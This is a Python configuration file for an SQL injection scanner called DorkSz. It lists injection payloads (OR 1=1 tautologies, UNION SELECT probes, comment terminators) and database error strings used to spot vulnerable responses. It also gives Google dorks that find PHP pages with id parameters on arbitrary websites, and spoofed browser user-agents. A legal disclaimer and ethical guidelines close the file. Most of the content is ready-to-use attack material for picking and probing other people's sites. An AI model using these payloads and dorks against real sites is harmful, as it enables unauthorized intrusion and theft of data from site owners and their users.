#!/usr/bin/env python3
"""
Configuration file for DorkSz - SQL Injection Vulnerability Scanner
"""

# Default settings
DEFAULT_TIMEOUT = 10
DEFAULT_DELAY = 0.5
DEFAULT_SEARCH_DELAY = 1.0
DEFAULT_MAX_RESULTS = 100
DEFAULT_PAYLOAD = "'"
DEFAULT_OUTPUT_FORMAT = 'txt'
DEFAULT_OUTPUT_FILE = 'vuln.txt'

# SQL Injection payloads
SQL_PAYLOADS = [
    "'", "''", "1'", "1''", "1' OR '1'='1", "1' OR '1'='1' --",
    "1' OR '1'='1' #", "1' OR '1'='1'/*", "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--", "1' AND 1=1--", "1' AND 1=2--",
    "' OR 'a'='a", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "') OR '1'='1--", "') OR ('1'='1--", "1' OR '1'='1", "1' OR 1 -- -",
    "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1'xor'1'='1"
]

# SQL Error patterns for detection
SQL_ERROR_PATTERNS = [
    'mysql_fetch_array', 'mysql_num_rows', 'mysql_error', 'mysqli_error',
    'mysqli_fetch_array', 'PostgreSQL query failed', 'Warning: pg_',
    'valid MySQL result', 'MySqlClient.', 'syntax error', 'ORA-', 'Oracle error',
    'Oracle driver', 'Warning: oci_', 'SQLite3::', 'sqlite_', 'SQLite error',
    'Warning: SQLite3::', 'Microsoft OLE DB Provider', 'ODBC SQL Server Driver',
    'SQL Server', 'Unclosed quotation mark', 'Microsoft OLE DB Provider for ODBC Drivers error',
    'syntax;', 'mysql_', 'mysqli_', 'pg_', 'sqlite_'
]

# Common Google dorks for SQL injection
COMMON_DORKS = [
    "inurl:admin.php?id=",
    "inurl:product.php?id=",
    "inurl:category.php?id=",
    "inurl:news.php?id=",
    "inurl:page.php?id=",
    "inurl:article.php?id=",
    "inurl:show.php?id=",
    "inurl:item.php?id=",
    "inurl:content.php?id=",
    "inurl:detail.php?id=",
    "inurl:view.php?id=",
    "inurl:product_detail.php?id=",
    "inurl:gallery.php?id=",
    "inurl:event.php?id=",
    "inurl:download.php?id=",
    "inurl:profile.php?id=",
    "inurl:member.php?id=",
    "inurl:user.php?id=",
    "inurl:customer.php?id=",
    "inurl:order.php?id="
]

# User agents for requests
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
]

# Output formats
OUTPUT_FORMATS = ['txt', 'csv', 'json']

# Rate limiting settings
MIN_DELAY = 0.1
MAX_DELAY = 10.0
DEFAULT_THREADS = 1  # Single threaded for safety

# Logging settings
LOG_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
LOG_DATE_FORMAT = '%Y-%m-%d %H:%M:%S'

# Update settings
UPDATE_URL = 'https://api.github.com/repos/0xHadiRamdhani/DorkSz/releases/latest'
CURRENT_VERSION = '4.0'

# Legal disclaimer
LEGAL_DISCLAIMER = """
LEGAL DISCLAIMER:
This tool is for educational and authorized testing purposes only.
Users are responsible for complying with applicable laws and regulations.
Only use this tool on websites you own or have explicit permission to test.
The authors are not responsible for misuse or damage caused by this tool.
"""

# Ethical guidelines
ETHICAL_GUIDELINES = """
ETHICAL GUIDELINES:
1. Only test websites you own or have written permission to test
2. Do not use this tool for malicious purposes
3. Report vulnerabilities responsibly to website owners
4. Follow responsible disclosure practices
5. Respect rate limits and don't overwhelm servers
6. Use findings to improve security, not for harm
"""